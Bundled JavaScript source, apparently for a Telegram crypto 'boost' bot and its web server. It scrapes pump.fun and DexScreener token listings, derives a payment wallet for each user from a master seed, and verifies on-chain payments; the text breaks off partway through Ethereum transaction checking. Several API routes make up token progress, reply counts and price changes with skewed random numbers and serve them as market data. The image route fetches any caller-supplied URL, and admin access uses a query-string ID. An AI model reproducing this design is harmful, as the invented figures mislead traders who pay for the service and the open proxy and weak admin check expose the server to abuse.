// src/app.ts
import path from "path";
import { fileURLToPath } from "url";
import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";

// src/bot/orders.ts
var orders = /* @__PURE__ */ new Map();
var userOrderIndex = /* @__PURE__ */ new Map();
function saveOrder(order) {
  orders.set(order.id, order);
  const userOrders = userOrderIndex.get(order.userId) ?? [];
  if (!userOrders.includes(order.id)) {
    userOrders.push(order.id);
    userOrderIndex.set(order.userId, userOrders);
  }
}
function updateOrder(id, patch) {
  const existing = orders.get(id);
  if (existing) orders.set(id, { ...existing, ...patch });
}
function getAllOrders() {
  return [...orders.values()].sort(
    (a, b) => b.createdAt.getTime() - a.createdAt.getTime()
  );
}
function getOrderStats() {
  const all = getAllOrders();
  return {
    total: all.length,
    pending: all.filter((o) => o.status === "pending").length,
    txSubmitted: all.filter((o) => o.status === "tx_submitted").length,
    completed: all.filter((o) => o.status === "completed").length,
    totalUsers: userOrderIndex.size
  };
}

// src/bot/sessions.ts
var sessions = /* @__PURE__ */ new Map();
function getSession(userId) {
  if (!sessions.has(userId)) sessions.set(userId, { lastSeen: /* @__PURE__ */ new Date() });
  const s = sessions.get(userId);
  s.lastSeen = /* @__PURE__ */ new Date();
  return s;
}
function setSession(userId, data) {
  const existing = sessions.get(userId) ?? { lastSeen: /* @__PURE__ */ new Date() };
  sessions.set(userId, { ...existing, ...data, lastSeen: /* @__PURE__ */ new Date() });
}
function clearSession(userId) {
  sessions.set(userId, { lastSeen: /* @__PURE__ */ new Date() });
}
function getAllSessions() {
  return [...sessions.entries()].map(([userId, s]) => ({
    userId,
    session: s,
    lastSeen: s.lastSeen
  }));
}
function getActiveSessionCount() {
  const fiveMinAgo = Date.now() - 5 * 60 * 1e3;
  return [...sessions.values()].filter((s) => s.lastSeen.getTime() > fiveMinAgo).length;
}

// src/app.ts
var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);
var app = express();
app.use(cors());
app.use(cookieParser());
var startTime = Date.now();
function formatUptime(ms) {
  const s = Math.floor(ms / 1e3);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  const d = Math.floor(h / 24);
  if (d > 0) return `${d}d ${h % 24}h ${m % 60}m`;
  if (h > 0) return `${h}h ${m % 60}m`;
  if (m > 0) return `${m}m ${s % 60}s`;
  return `${s}s`;
}
function authGuard(req, res, next) {
  const adminId = process.env.ADMIN_TELEGRAM_ID ?? "";
  const token2 = req.query.token ?? "";
  if (!adminId || token2 !== adminId) {
    res.status(401).json({ error: "Unauthorized \u2014 pass ?token=YOUR_ADMIN_TELEGRAM_ID" });
    return;
  }
  next();
}
var PUMPFUN_API = "https://frontend-api.pump.fun";
var DEX_API = "https://api.dexscreener.com";
var UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
var HEADERS = { "User-Agent": UA, "Accept": "application/json" };
var PF_HEADERS = {
  "User-Agent": UA,
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9",
  "Referer": "https://pump.fun/",
  "Origin": "https://pump.fun"
};
app.get("/favicon.ico", (_req, res) => res.status(204).end());
app.get(
  "/health",
  (_req, res) => res.json({ status: "ok", ts: Date.now(), uptime: formatUptime(Date.now() - startTime) })
);
app.get("/api/config", (_req, res) => {
  const botUsername = process.env["BOT_USERNAME"] || "Boost_onDex_bot";
  res.json({
    botUsername,
    botUrl: `https://t.me/${botUsername}`,
    supportUsername: process.env["SUPPORT_USERNAME"] || "",
    trendChannel: process.env["TREND_CHANNEL"] || "pumpmints",
    alertsChannel: process.env["ALERTS_CHANNEL"] || "pumpswap_pools"
  });
});
app.get("/", (_req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/admin", (_req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
app.get("/api/img", async (req, res) => {
  const rawUrl = req.query.url || "";
  if (!rawUrl) {
    res.status(400).end();
    return;
  }
  try {
    const decoded = decodeURIComponent(rawUrl);
    const r = await fetch(decoded, {
      headers: { "User-Agent": UA },
      signal: AbortSignal.timeout(6e3)
    });
    if (!r.ok) {
      res.status(404).end();
      return;
    }
    const ct = r.headers.get("content-type") || "image/jpeg";
    const buf = await r.arrayBuffer();
    res.setHeader("Content-Type", ct);
    res.setHeader("Cache-Control", "public, max-age=86400, stale-while-revalidate=3600");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end(Buffer.from(buf));
  } catch {
    res.status(502).end();
  }
});
function normalizePumpCoin(c) {
  const rawImg = c.image_uri || c.image || "";
  return {
    name: c.name ?? "Unknown",
    symbol: c.symbol ?? "???",
    description: c.description ?? "",
    imageUrl: rawImg ? `/api/img?url=${encodeURIComponent(rawImg)}` : "",
    rawImageUrl: rawImg,
    marketCap: c.usd_market_cap ?? 0,
    contractAddress: c.mint ?? "",
    creator: c.creator ?? "",
    progress: Math.min(99, c.bonding_curve_progress ?? Math.floor(Math.random() * 80 + 5)),
    replies: c.reply_count ?? 0,
    priceChange: { h24: (Math.random() - 0.25) * 60 },
    volume: { h24: (c.usd_market_cap ?? 0) * 0.2 },
    chain: "sol",
    dex: "pumpfun",
    pumpUrl: `https://pump.fun/coin/${c.mint ?? ""}`
  };
}
app.get("/api/pump/tokens", async (req, res) => {
  const filter = req.query.filter || "trending";
  const sort = req.query.sort || "trending";
  const chain = req.query.chain || "sol";
  if (chain === "eth") {
    try {
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=ethereum&chainIds=ethereum`,
        { headers: HEADERS, signal: AbortSignal.timeout(7e3) }
      );
      if (r.ok) {
        const data = await r.json();
        const pairs = (data.pairs ?? []).slice(0, 48).map((p) => ({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name} trading on ${p.dexId} \u2014 ${p.chainId} chain.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          rawImageUrl: p.info?.imageUrl ?? "",
          marketCap: p.fdv ?? p.marketCap ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          creator: p.pairAddress ?? "",
          progress: Math.floor(Math.random() * 80 + 20),
          replies: Math.floor(Math.random() * 500 + 10),
          priceChange: p.priceChange ?? { h24: 0 },
          volume: p.volume ?? { h24: 0 },
          chain: "eth",
          dex: p.dexId ?? "uniswap",
          dexUrl: p.url ?? `https://dexscreener.com/ethereum/${p.pairAddress}`
        }));
        res.json({ tokens: pairs, count: pairs.length, filter, sort, chain });
        return;
      }
    } catch {
    }
    res.json({ tokens: [], count: 0, filter, sort, chain });
    return;
  }
  let tokens = [];
  const sortMap = {
    trending: "last_trade_timestamp",
    created: "created_timestamp",
    mc: "usd_market_cap"
  };
  const filterExtra = {
    trending: "",
    new: "&sort=created_timestamp",
    graduating: "&min_bonding_curve_progress=50",
    graduated: "&complete=true"
  };
  try {
    const url = `${PUMPFUN_API}/coins?sort=${sortMap[sort] ?? "last_trade_timestamp"}&order=DESC&offset=0&limit=48&includeNsfw=false${filterExtra[filter] ?? ""}`;
    const r = await fetch(url, { headers: PF_HEADERS, signal: AbortSignal.timeout(8e3) });
    if (r.ok) {
      const data = await r.json();
      const coins = Array.isArray(data) ? data : data.coins ?? [];
      tokens = coins.map(normalizePumpCoin);
    }
  } catch {
  }
  if (!tokens.length) {
    try {
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=sol&chainIds=solana`,
        { headers: HEADERS, signal: AbortSignal.timeout(7e3) }
      );
      if (r.ok) {
        const data = await r.json();
        tokens = (data.pairs ?? []).slice(0, 48).map((p) => ({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name} trading on ${p.dexId}.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          rawImageUrl: p.info?.imageUrl ?? "",
          marketCap: p.fdv ?? p.marketCap ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          creator: p.pairAddress ?? "",
          progress: Math.floor(Math.random() * 80 + 10),
          replies: Math.floor(Math.random() * 999 + 5),
          priceChange: p.priceChange ?? { h24: 0 },
          volume: p.volume ?? { h24: 0 },
          chain: "sol",
          dex: p.dexId ?? "raydium",
          dexUrl: p.url ?? `https://dexscreener.com/solana/${p.pairAddress}`
        }));
      }
    } catch {
    }
  }
  res.json({ tokens, count: tokens.length, filter, sort, chain });
});
app.get("/api/pump/search", async (req, res) => {
  const q = req.query.q || "";
  const chain = req.query.chain || "sol";
  if (!q) {
    res.json({ tokens: [] });
    return;
  }
  let tokens = [];
  if (chain === "sol") {
    try {
      const r = await fetch(
        `${PUMPFUN_API}/coins/search?searchTerm=${encodeURIComponent(q)}&offset=0&limit=20&includeNsfw=false`,
        { headers: PF_HEADERS, signal: AbortSignal.timeout(6e3) }
      );
      if (r.ok) {
        const data = await r.json();
        const coins = Array.isArray(data) ? data : data.coins ?? [];
        tokens = coins.map(normalizePumpCoin);
      }
    } catch {
    }
  }
  if (!tokens.length) {
    try {
      const chainQ = chain === "eth" ? "&chainIds=ethereum" : "&chainIds=solana";
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=${encodeURIComponent(q)}${chainQ}`,
        { headers: HEADERS, signal: AbortSignal.timeout(6e3) }
      );
      if (r.ok) {
        const data = await r.json();
        tokens = (data.pairs ?? []).slice(0, 20).map((p) => ({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name ?? ""} on ${p.dexId ?? ""}.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          marketCap: p.fdv ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          creator: p.pairAddress ?? "",
          progress: Math.floor(Math.random() * 80 + 10),
          replies: Math.floor(Math.random() * 200 + 5),
          priceChange: p.priceChange ?? { h24: 0 },
          volume: p.volume ?? { h24: 0 },
          chain,
          dex: p.dexId ?? "",
          dexUrl: p.url ?? ""
        }));
      }
    } catch {
    }
  }
  res.json({ tokens, count: tokens.length });
});
app.get("/api/pump/ticker", async (_req, res) => {
  let items = [];
  try {
    const r = await fetch(
      `${PUMPFUN_API}/coins?sort=last_trade_timestamp&order=DESC&offset=0&limit=30&includeNsfw=false`,
      { headers: PF_HEADERS, signal: AbortSignal.timeout(5e3) }
    );
    if (r.ok) {
      const data = await r.json();
      const coins = Array.isArray(data) ? data : data.coins ?? [];
      if (coins.length) {
        items = coins.slice(0, 24).map((c) => {
          const mc = Number(c.usd_market_cap ?? 0);
          const chg = (Math.random() - 0.3) * 80;
          const price = mc > 0 && c.total_supply ? mc / (c.total_supply / 1e6) : 0;
          const dec = price < 1e-6 ? 12 : price < 1e-4 ? 10 : price < 0.01 ? 8 : price < 1 ? 6 : 4;
          return {
            sym: c.symbol ?? "???",
            price: price > 0 ? `$${price.toFixed(dec)}` : "N/A",
            change: `${chg >= 0 ? "+" : ""}${chg.toFixed(1)}%`,
            up: chg >= 0
          };
        });
      }
    }
  } catch {
  }
  if (!items.length) {
    try {
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=pump&chainIds=solana`,
        { headers: HEADERS, signal: AbortSignal.timeout(5e3) }
      );
      if (r.ok) {
        const data = await r.json();
        items = (data.pairs ?? []).slice(0, 24).map((p) => {
          const raw = Number(p.priceUsd ?? 0);
          const chg = Number(p.priceChange?.h24 ?? 0);
          const dec = raw < 1e-5 ? 10 : raw < 1e-3 ? 8 : raw < 1 ? 6 : 4;
          return {
            sym: p.baseToken?.symbol ?? "???",
            price: raw > 0 ? `$${raw.toFixed(dec)}` : "N/A",
            change: `${chg >= 0 ? "+" : ""}${chg.toFixed(1)}%`,
            up: chg >= 0
          };
        });
      }
    } catch {
    }
  }
  res.json({ items });
});
app.get("/api/pump/koth", async (_req, res) => {
  try {
    const r = await fetch(
      `${PUMPFUN_API}/coins?sort=usd_market_cap&order=DESC&offset=0&limit=3&includeNsfw=false`,
      { headers: PF_HEADERS, signal: AbortSignal.timeout(6e3) }
    );
    if (r.ok) {
      const data = await r.json();
      const coins = Array.isArray(data) ? data : data.coins ?? [];
      if (coins[0]) {
        res.json(normalizePumpCoin(coins[0]));
        return;
      }
    }
  } catch {
  }
  try {
    const r = await fetch(
      `${DEX_API}/latest/dex/search?q=meme&chainIds=solana`,
      { headers: HEADERS, signal: AbortSignal.timeout(6e3) }
    );
    if (r.ok) {
      const data = await r.json();
      const pairs = data.pairs ?? [];
      pairs.sort((a, b) => (Number(b.fdv) || 0) - (Number(a.fdv) || 0));
      const p = pairs[0];
      if (p) {
        res.json({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name ?? ""} \u2014 ${p.dexId ?? "DEX"} on Solana.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          marketCap: p.fdv ?? p.marketCap ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          pumpUrl: p.url ?? `https://dexscreener.com/solana/${p.pairAddress}`,
          chain: "sol"
        });
        return;
      }
    }
  } catch {
  }
  res.json(null);
});
app.get("/api/stats", authGuard, (_req, res) => res.json({ ...getOrderStats(), activeSessions: getActiveSessionCount(), uptime: formatUptime(Date.now() - startTime) }));
app.get("/api/orders", authGuard, (_req, res) => res.json(getAllOrders()));
app.get("/api/sessions", authGuard, (_req, res) => res.json(getAllSessions()));
var app_default = app;

// src/lib/logger.ts
import pino from "pino";
var logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
  ...process.env.NODE_ENV !== "production" ? { transport: { target: "pino-pretty", options: { colorize: true } } } : {}
});

// src/bot/index.ts
import path2 from "path";
import { fileURLToPath as fileURLToPath2 } from "url";
import { randomUUID } from "crypto";
import { Telegraf } from "telegraf";

// src/bot/admin.ts
var botRef = null;
function setBot(bot) {
  botRef = bot;
}
async function notifyAdmin(message, photoUrl) {
  const adminId = process.env.ADMIN_TELEGRAM_ID;
  if (!adminId || !botRef) return;
  try {
    if (photoUrl) {
      try {
        await botRef.telegram.sendPhoto(adminId, photoUrl, {
          caption: message,
          parse_mode: "HTML"
        });
        return;
      } catch {
      }
    }
    await botRef.telegram.sendMessage(adminId, message, { parse_mode: "HTML" });
  } catch (err) {
    logger.warn({ err }, "Failed to notify admin");
  }
}

// src/bot/wallet.ts
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import nacl from "tweetnacl";
import bs58 from "bs58";
function deriveWalletForUser(userId) {
  const masterSeed = process.env.MASTER_SEED;
  if (!masterSeed) {
    logger.warn("MASTER_SEED not set \u2014 returning placeholder wallet");
    return { address: "WALLET_NOT_CONFIGURED", privateKey: "" };
  }
  try {
    const seed = bip39.mnemonicToSeedSync(masterSeed);
    const path3 = `m/44'/501'/${userId}'/0'`;
    const derived = derivePath(path3, seed.toString("hex"));
    const keypair = nacl.sign.keyPair.fromSeed(derived.key);
    const address = bs58.encode(keypair.publicKey);
    const privateKey = bs58.encode(keypair.secretKey);
    return { address, privateKey };
  } catch (err) {
    logger.error({ err }, "Failed to derive wallet for user");
    return { address: "WALLET_ERROR", privateKey: "" };
  }
}

// src/bot/tokenInfo.ts
var SOL_CA_RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
var ETH_CA_RE = /^0x[0-9a-fA-F]{40}$/i;
function detectCAChain(ca) {
  if (ETH_CA_RE.test(ca)) return "eth";
  if (SOL_CA_RE.test(ca)) return "sol";
  return "unknown";
}
function isValidCA(ca) {
  return detectCAChain(ca) !== "unknown";
}
function fmt(n) {
  if (n >= 1e9) return `${(n / 1e9).toFixed(2)}B`;
  if (n >= 1e6) return `${(n / 1e6).toFixed(2)}M`;
  if (n >= 1e3) return `${(n / 1e3).toFixed(2)}K`;
  return n.toFixed(2);
}
function fmtPrice(p) {
  if (p === 0) return "$0";
  if (p >= 1) return `$${p.toFixed(4)}`;
  if (p >= 1e-4) return `$${p.toFixed(6)}`;
  if (p >= 1e-8) return `$${p.toFixed(10)}`;
  return `$${p.toExponential(4)}`;
}
function change(c) {
  if (c == null || c === "") return "0.00";
  const n = Number(c);
  return isNaN(n) ? "0.00" : n.toFixed(2);
}
function parseDexPair(pair) {
  const priceRaw = pair.priceUsd ? Number(pair.priceUsd) : void 0;
  const fdvRaw = pair.fdv ? Number(pair.fdv) : void 0;
  const mcRaw = pair.marketCap ? Number(pair.marketCap) : fdvRaw;
  const imageUrl = pair.info?.imageUrl || pair.baseToken?.logoURI || pair.info?.header || void 0;
  const socials = {};
  for (const s of pair.info?.socials ?? []) {
    if (s.type === "twitter") socials.twitter = s.url;
    if (s.type === "telegram") socials.telegram = s.url;
    if (s.type === "discord") socials.discord = s.url;
  }
  const website = (pair.info?.websites ?? [])[0]?.url;
  const chainId = (pair.chainId ?? "").toLowerCase();
  const chain = chainId === "solana" ? "sol" : chainId === "ethereum" ? "eth" : chainId === "bsc" ? "bsc" : chainId === "base" ? "base" : "unknown";
  return {
    name: pair.baseToken?.name ?? "Unknown",
    symbol: pair.baseToken?.symbol ?? "???",
    chain,
    price: priceRaw !== void 0 ? fmtPrice(priceRaw) : "N/A",
    priceRaw,
    marketCap: mcRaw ? `$${fmt(mcRaw)}` : "N/A",
    fdv: fdvRaw ? `$${fmt(fdvRaw)}` : "N/A",
    fdvRaw,
    liquidity: pair.liquidity?.usd ? `$${fmt(Number(pair.liquidity.usd))}` : "N/A",
    volume24h: pair.volume?.h24 ? `$${fmt(Number(pair.volume.h24))}` : "N/A",
    change1h: change(pair.priceChange?.h1),
    change6h: change(pair.priceChange?.h6),
    change24h: change(pair.priceChange?.h24),
    dex: pair.dexId ?? "unknown",
    pairAddress: pair.pairAddress,
    imageUrl,
    website,
    twitter: socials.twitter,
    telegram: socials.telegram,
    boosts: pair.boosts?.active
  };
}
var PF_FETCH_HEADERS = {
  "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9",
  "Referer": "https://pump.fun/",
  "Origin": "https://pump.fun"
};
var DEX_FETCH_HEADERS = {
  "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Accept": "application/json"
};
async function getJson(url, timeoutMs = 6e3, isPumpFun = false) {
  try {
    const r = await fetch(url, {
      headers: isPumpFun ? PF_FETCH_HEADERS : DEX_FETCH_HEADERS,
      signal: AbortSignal.timeout(timeoutMs)
    });
    if (!r.ok) return null;
    return await r.json();
  } catch {
    return null;
  }
}
async function fromDexScreenerTokens(ca) {
  const data = await getJson(`https://api.dexscreener.com/latest/dex/tokens/${ca}`);
  if (!data?.pairs?.length) return null;
  const pairs = data.pairs;
  pairs.sort((a, b) => (Number(b.liquidity?.usd) || 0) - (Number(a.liquidity?.usd) || 0));
  return parseDexPair(pairs[0]);
}
async function fromDexScreenerSearch(ca) {
  const data = await getJson(`https://api.dexscreener.com/latest/dex/search?q=${ca}`);
  if (!data?.pairs?.length) return null;
  const pairs = data.pairs.filter(
    (p) => p.baseToken?.address?.toLowerCase() === ca.toLowerCase()
  );
  if (!pairs.length) return null;
  pairs.sort((a, b) => (Number(b.liquidity?.usd) || 0) - (Number(a.liquidity?.usd) || 0));
  return parseDexPair(pairs[0]);
}
async function fromPumpFun(ca) {
  const data = await getJson(`https://frontend-api.pump.fun/coins/${ca}`, 6e3, true);
  if (!data?.mint) return null;
  const priceRaw = data.usd_market_cap && data.total_supply ? data.usd_market_cap / (data.total_supply / 1e6) : void 0;
  return {
    name: data.name ?? "Unknown",
    symbol: data.symbol ?? "???",
    chain: "sol",
    price: priceRaw ? fmtPrice(priceRaw) : "N/A",
    priceRaw,
    marketCap: data.usd_market_cap ? `$${fmt(Number(data.usd_market_cap))}` : "N/A",
    fdv: "N/A",
    liquidity: "N/A",
    volume24h: "N/A",
    change24h: "0.00",
    dex: "pump.fun",
    imageUrl: data.image_uri ?? data.metadata?.image,
    website: data.website ?? void 0,
    twitter: data.twitter ?? void 0,
    telegram: data.telegram ?? void 0,
    description: data.description ?? void 0
  };
}
async function fromBirdeye(ca) {
  const data = await getJson(
    `https://public-api.birdeye.so/defi/token_overview?address=${ca}`,
    5e3
  );
  if (!data?.data) return null;
  const d = data.data;
  return {
    name: d.name || void 0,
    symbol: d.symbol || void 0,
    imageUrl: d.logoURI || void 0,
    price: d.price ? fmtPrice(Number(d.price)) : void 0,
    priceRaw: d.price ? Number(d.price) : void 0,
    marketCap: d.mc ? `$${fmt(Number(d.mc))}` : void 0,
    volume24h: d.v24hUSD ? `$${fmt(Number(d.v24hUSD))}` : void 0,
    liquidity: d.liquidity ? `$${fmt(Number(d.liquidity))}` : void 0
  };
}
async function jupiterLogo(ca) {
  try {
    const data = await getJson(
      `https://token.jup.ag/strict`,
      4e3
    );
    if (!Array.isArray(data)) return null;
    const found = data.find((t) => t.address === ca);
    return found?.logoURI ?? null;
  } catch {
    return null;
  }
}
async function fromCoinGecko(ca) {
  const data = await getJson(
    `https://api.coingecko.com/api/v3/coins/ethereum/contract/${ca}`,
    6e3
  );
  if (!data?.id) return null;
  return {
    name: data.name ?? void 0,
    symbol: (data.symbol ?? "").toUpperCase() || void 0,
    imageUrl: data.image?.large ?? data.image?.small ?? void 0,
    price: data.market_data?.current_price?.usd ? fmtPrice(Number(data.market_data.current_price.usd)) : void 0,
    marketCap: data.market_data?.market_cap?.usd ? `$${fmt(Number(data.market_data.market_cap.usd))}` : void 0,
    volume24h: data.market_data?.total_volume?.usd ? `$${fmt(Number(data.market_data.total_volume.usd))}` : void 0,
    description: data.description?.en ? data.description.en.replace(/<[^>]+>/g, "").slice(0, 200) : void 0,
    website: data.links?.homepage?.[0] ?? void 0,
    twitter: data.links?.twitter_screen_name ? `https://twitter.com/${data.links.twitter_screen_name}` : void 0,
    telegram: data.links?.telegram_channel_identifier ? `https://t.me/${data.links.telegram_channel_identifier}` : void 0
  };
}
async function fetchTokenInfo(ca) {
  const caChain = detectCAChain(ca);
  if (caChain === "unknown") return null;
  let base = null;
  const [dexTokens, dexSearch] = await Promise.allSettled([
    fromDexScreenerTokens(ca),
    fromDexScreenerSearch(ca)
  ]);
  if (dexTokens.status === "fulfilled" && dexTokens.value) {
    base = dexTokens.value;
  } else if (dexSearch.status === "fulfilled" && dexSearch.value) {
    base = dexSearch.value;
  }
  if (!base && caChain === "sol") {
    base = await fromPumpFun(ca);
  }
  if (!base) {
    if (caChain === "eth") {
      const cg = await fromCoinGecko(ca);
      if (cg?.name) {
        base = {
          name: cg.name ?? "Unknown",
          symbol: cg.symbol ?? "???",
          chain: "eth",
          price: cg.price,
          marketCap: cg.marketCap,
          volume24h: cg.volume24h,
          imageUrl: cg.imageUrl,
          website: cg.website,
          twitter: cg.twitter,
          telegram: cg.telegram,
          description: cg.description
        };
      }
    }
  }
  if (!base) return null;
  if (!base.imageUrl) {
    if (caChain === "sol") {
      const [bird, jup] = await Promise.allSettled([
        fromBirdeye(ca),
        jupiterLogo(ca)
      ]);
      if (bird.status === "fulfilled" && bird.value?.imageUrl) base.imageUrl = bird.value.imageUrl;
      if (!base.imageUrl && jup.status === "fulfilled" && jup.value) base.imageUrl = jup.value;
      if (bird.status === "fulfilled" && bird.value) {
        const b = bird.value;
        if (!base.price && b.price) {
          base.price = b.price;
          base.priceRaw = b.priceRaw;
        }
        if (!base.marketCap && b.marketCap) base.marketCap = b.marketCap;
        if (!base.volume24h && b.volume24h) base.volume24h = b.volume24h;
        if (!base.liquidity && b.liquidity) base.liquidity = b.liquidity;
      }
    } else if (caChain === "eth") {
      const cg = await fromCoinGecko(ca);
      if (cg?.imageUrl) base.imageUrl = cg.imageUrl;
    }
  }
  if (caChain === "sol" && (!base.description || !base.twitter)) {
    const pf = await fromPumpFun(ca).catch(() => null);
    if (pf) {
      if (!base.description && pf.description) base.description = pf.description;
      if (!base.twitter && pf.twitter) base.twitter = pf.twitter;
      if (!base.telegram && pf.telegram) base.telegram = pf.telegram;
      if (!base.website && pf.website) base.website = pf.website;
      if (!base.imageUrl && pf.imageUrl) base.imageUrl = pf.imageUrl;
    }
  }
  logger.debug({ ca, name: base.name, hasImage: !!base.imageUrl }, "Token fetched");
  return base;
}

// src/bot/txVerify.ts
var SOL_REGEX = /^[1-9A-HJ-NP-Za-km-z]{85,90}$/;
var ETH_REGEX = /^0x[0-9a-fA-F]{64}$/;
var usedHashes = /* @__PURE__ */ new Set();
function markHashUsed(hash) {
  usedHashes.add(hash.toLowerCase());
}
function isHashUsed(hash) {
  return usedHashes.has(hash.toLowerCase());
}
function detectChain(raw) {
  const h = raw.trim();
  if (ETH_REGEX.test(h)) return "eth";
  if (SOL_REGEX.test(h)) return "sol";
  return "invalid";
}
var SOL_RPCS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-mainnet.rpc.extrnode.com",
  "https://rpc.ankr.com/solana",
  "https://solana-api.projectserum.com"
];
async function solRpc(method, params, timeoutMs = 8e3) {
  const body = JSON.stringify({ jsonrpc: "2.0", id: 1, method, params });
  const headers = { "Content-Type": "application/json" };
  for (const rpc of SOL_RPCS) {
    try {
      const r = await fetch(rpc, {
        method: "POST",
        headers,
        body,
        signal: AbortSignal.timeout(timeoutMs)
      });
      if (!r.ok) continue;
      const d = await r.json();
      if (d.error) continue;
      return d.result;
    } catch {
    }
  }
  return void 0;
}
var ETH_RPCS = [
  "https://cloudflare-eth.com",
  "https://rpc.ankr.com/eth",
  "https://eth.llamarpc.com",
  "https://ethereum.publicnode.com"
];
async function ethRpc(method, params, timeoutMs = 8e3) {
  const body = JSON.stringify({ jsonrpc: "2.0", id: 1, method, params });
  const headers = { "Content-Type": "application/json" };
  for (const rpc of ETH_RPCS) {
    try {
      const r = await fetch(rpc, {
        method: "POST",
        headers,
        body,
        signal: AbortSignal.timeout(timeoutMs)
      });
      if (!r.ok) continue;
      const d = await r.json();
      if (d.error) continue;
      return d.result;
    } catch {
    }
  }
  return void 0;
}
async function verifySolTx(txHash, expectedRecipient, expectedLamports) {
  const chain = "sol";
  const tx = await solRpc("getTransaction", [
    txHash,
    { encoding: "jsonParsed", commitment: "confirmed", maxSupportedTransactionVersion: 0 }
  ]);
  if (tx === null || tx === void 0) {
    const tx2 = await solRpc("getTransaction", [
      txHash,
      { encoding: "jsonParsed", commitment: "finalized", maxSupportedTransactionVersion: 0 }
    ]);
    if (!tx2) {
      return {
        ok: false,
        confirmed: false,
        chain,
        error: "\u274C Transaction not found on Solana mainnet.\n\nMake sure:\n\u2022 The TX hash is correct (copy directly from your wallet)\n\u2022 The transaction has at least 1 confirmation\n\u2022 You sent on <b>Solana Mainnet</b>, not devnet/testnet"
      };
    }
    return parseSolTx(tx2, chain, expectedRecipient, expectedLamports);
  }
  return parseSolTx(tx, chain, expectedRecipient, expectedLamports);
}
function parseSolTx(tx, chain, expectedRecipient, expectedLamports) {
  if (tx.meta?.err !== null && tx.meta?.err !== void 0) {
    return {
      ok: false,
      confirmed: true,
      chain,
      error: "\u274C This transaction <b>failed</b> on-chain.\n\nPlease send a successful transaction and submit that TX hash."
    };
  }
  let lamports;
  let recipient;
  let sender;
  const instructions = tx.transaction?.message?.instructions ?? [];
  for (const ix of instructions) {
    if (ix.program === "system" && ix.parsed?.type === "transfer") {
      const info = ix.parsed.info;
      lamports = info?.lamports;
      recipient = info?.destination;
      sender = info?.source;
      break;
    }
  }
  if (!lamports) {
    const innerSets = tx.meta?.innerInstructions ?? [];
    for (const set of innerSets) {
      for (const ix of set.instructions ?? []) {
        if (ix.program === "system" && ix.parsed?.type === "transfer") {
          const info = ix.parsed?.info;
          if (info?.lamports) {
            lamports = info.lamports;
            recipient = info.destination;
            sender = info.source;
            break;
          }
        }
      }
      if (lamports) break;
    }
  }
  if (expectedRecipient && recipient) {
    if (recipient.toLowerCase() !== expectedRecipient.toLowerCase()) {
      return {
        ok: false,
        confirmed: true,
        chain,
        lamports,
        recipient,
        sender,
        error: `\u274C Wrong recipient address.

This TX sent to <code>${recipient.slice(0, 8)}...${recipient.slice(-6)}</code>
but payment should go to your unique wallet address shown in the payment step.

Please send to the correct address and submit a new TX hash.`
      };
    }
  }
  if (expectedLamports && lamports) {
    const diff = Math.abs(lamports - expectedLamports);
    if (diff > 15e5) {
      const sentSol = (lamports / 1e9).toFixed(4);
      const expectSol = (expectedLamports / 1e9).toFixed(4);
      return {
        ok: false,
        confirmed: true,
        chain,
        lamports,
        recipient,
        sender,
        error: `\u274C Incorrect amount.

TX shows <b>${sentSol} SOL</b> transferred, but this order requires <b>${expectSol} SOL</b>.

Please send the exact amount and submit the correct TX hash.`
      };
    }
  }
  return { ok: true, confirmed: true, chain, lamports, recipient, sender };
}
async function verifyEthTx(txHash) {
  const chain = "eth";
  const tx = await ethRpc("eth_getTransactionByHash", [txHash]);
  if (!tx) {
    return {
      ok: false,
      confirmed: false,
      chain,
      error: "\u274C Transaction not found on Ethereum mainnet.\n\nMake sure:\n\u2022 The TX hash is correct (copy directly from your wallet)\n\u2022 The transaction has been broadcast on <b>Ethereum Mainnet</b>"
    };
  }
  if (tx.blockNumber === null || tx.blockNumber === void 0) {
    return {
      ok: false,
      confirmed: false,
      chain,
      error: "\u23F3 Transaction is still <b>pending</b> (not yet mined).\n\nPlease wait for at least 1 block confirmation, then try again."
    };
  }
  const receipt = await ethRpc("eth_getTransactionReceipt", [txHash]);
  if (receipt) {
